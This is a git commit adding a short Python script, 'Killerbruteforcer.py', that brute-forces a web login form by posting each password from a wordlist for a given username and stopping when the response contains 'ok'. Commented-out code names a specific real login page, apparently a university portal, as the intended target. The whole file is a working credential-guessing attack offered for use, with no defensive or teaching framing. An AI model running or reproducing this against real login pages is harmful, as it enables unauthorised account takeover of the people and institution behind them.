8588c2b6bb31419b42246cbe2f589786ee535179
0xmk4y <119784202+0xmk4y@users.noreply.github.com>
2022-12-04 19:22:47 +0000

    Add files via upload

---
+++ Killerbruteforcer.py
@@ -0,0 +1,33 @@
+import requests
+
+#url of the page 
+url = input("[+] Input url of the login page ")
+
+#taking username
+username = input("[+]]Enter username ")
+
+#taking wordlist directory
+wordlists_path = input("[+]Specify the name or loacation of your wordlists ")
+
+
+#url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
+
+#reading wordlist file
+with open(wordlists_path) as wordlists:
+    for passwd in wordlists:
+        data = {'username':username, 'password':passwd}
+        r = requests.post(url, data=data)
+        if 'ok'.encode() in r.content:
+            print("Password found:%s" %(passwd))
+            break
+        else:
+            print("checking %s with username:%s and password:%s" %(url, username, passwd) )
+
+'''
+    data = {'username':username,'password':passwd}
+    r = requests.post('https://erp.gctu.edu.gh/sip/auth/login.php', data = data)
+    if 'ok'.encode() in r.content:
+        print("Password found")
+    else:
+        print("Checking password %s" % passwd)
+'''
